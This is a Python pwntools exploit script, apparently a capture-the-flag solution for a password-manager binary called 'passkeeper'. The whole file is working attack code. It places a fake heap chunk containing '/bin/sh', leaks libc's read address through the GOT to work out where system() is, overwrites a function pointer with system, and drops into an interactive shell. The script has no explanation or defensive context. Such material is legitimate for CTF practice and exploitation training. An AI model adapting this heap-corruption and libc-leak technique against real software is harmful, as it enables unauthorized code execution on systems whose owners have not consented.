from pwn import *

read_got = 0x404040
user_bss = 0x4040C0

if __name__ == "__main__":

	#p = remote( '', )
	p = process( ["./ld-linux-x86-64.so.2", "--library-path","libs/","./passkeeper"] )
	libc = ELF( "./libc.so.6" )
	# 0x4012A4
	#gdb.attach( p, '''b *0x4014A2
	#	continue'''
	#)

	p.recvuntil( ': ' )

	fake_chunk = '/bin/sh\x00'
	fake_chunk += p64( 0x0 )
	fake_chunk += p64( 0x0 ) # prev_size
	fake_chunk += p64( 0x40 ) # size 
	fake_chunk += p64( 0x0 ) # fd 
	fake_chunk += p64( 0x0 ) # bk
	fake_chunk = fake_chunk.ljust( 0x40, '\x00' )

	p.send( fake_chunk ) # name

	p.recvuntil( ": " )
	p.send( p64( read_got ) ) # secret

	for i in range( 0, 16 ):
		p.recvuntil( "> " )
		p.send( "1\n" ) # keep password
		p.recvuntil( ": " )
		p.send( "pass\n" ) # password data

	p.send( "2\n" ) # view password
	p.recvuntil( ": " )
	p.send( "16\n" )
	p.recvline()
	
	leak = p.recvline().strip().split( ': ' )[ 1 ] + '\x00' * 2 
	
	leak = u64( leak )
	libc_base = leak - libc.symbols[ 'read' ]
	system = libc_base + libc.symbols[ 'system' ]
	
	print "leak: 0x%x" % leak
	print "libc: 0x%x" % libc_base
	print "system: 0x%x" % system

	p.recvuntil( "> " )
	p.send( "5\n" ) # delete all passwords
	p.recvuntil( "> " )
	p.send( "7\n" )
	p.recvuntil( ": " )
	p.send( p64( user_bss + 0x20 ) )
	
	for i in range( 0, 8 ):
		p.recvuntil( "> " )
		p.send( "1\n" ) # keep password
		p.recvuntil( ": " )
		p.send( "pass\n" ) # password data

	p.recvuntil( "> " )
	p.send( "4\n" ) # delete password 
	p.recvuntil( ": " ) # write idx
	p.send( "16\n" )

	p.recvuntil( "> " )
	p.send( "1\n" )
	p.recvuntil( ": " )

	payload = p64(0x0)
	payload += p64(0x0)
	payload += p64(0x0)
	payload += p64(0x0)
	payload += p64( system )

	p.send( payload )
	p.recvuntil( "> " )
	p.send( "6\n" )

	p.interactive()